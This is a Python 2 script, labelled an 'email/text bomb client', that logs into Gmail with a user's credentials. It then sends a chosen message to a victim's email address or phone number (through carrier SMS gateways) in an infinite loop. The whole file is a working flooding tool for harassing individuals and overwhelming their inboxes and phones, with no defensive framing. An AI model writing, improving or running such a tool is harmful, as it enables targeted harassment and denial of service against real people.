#!/usr/bin/python/
import smtplib

print """
    *+++++++++++++++++++++++++++++++++++++++++
    *                                        *
    * welcome to a email/text bomb client    *
    * you can send email/text bomb, or just  *
    * a regular email, or 2 or 3 if wanted.  *
    * just follow the promt.                 *
    *                                        *
    *+++++++++++++++++++++++++++++++++++++++++

    lets log into gmail"""


username = raw_input("your email?  > ")
password = raw_input("password?  > ")

gm = smtplib.SMTP('smtp.gmail.com:587')
gm.starttls()
gm.login(username,password)
#if correct  your logged in
print """ you are logged in

   regular email, text bomb, email bomb?

   1) regular email
   2) text bomb
   3) email bomb """

option1 = raw_input(">  ")
if option1 =="1":
 msg1 = raw_input("enter message >  ")
 to1 = raw_input("enter email receiver  >  ")
 gm.sendmail(username, to1, msg1)
 print 'bomb sent'

if option1 =="2":
 tb = 0
 raw_input("press enter to contine   ")
 print """

 What is their service?

	1. AT&T
	2. Sprint
	3. T-Mobile
	4. Verizon	or straight talk
	5. Virgin mobile
"""
#chose service
 option2 = input()
 if option2 ==1:
   tb = "@txt.att.net"
 if option2 ==2:
   tb = "@messaging.sprintpcs.com"
 if option2 ==3:
   tb = "@tmomail.net"
 if option2 ==4:
   tb = "@vtext.com"
 if option2 ==5:
   tb = "@vmobl.com"
 number = raw_input("whats their number????  >   ") + str(tb)
 msg2 = raw_input('enter message  >  ')
 var = 1
 while var ==1 :
  gm.sendmail(username, number, msg2)
  print 'sent bomb!!!'

if option1 =="3":
 to2 = raw_input('enter receivers email  >  ')
 msg3 = raw_input('enter message  >  ')
# and this should start the email bomb
 var = 1
 while var ==1 :
  gm.sendmail(username, to2, msg3)
  print 'sent bomb!!!'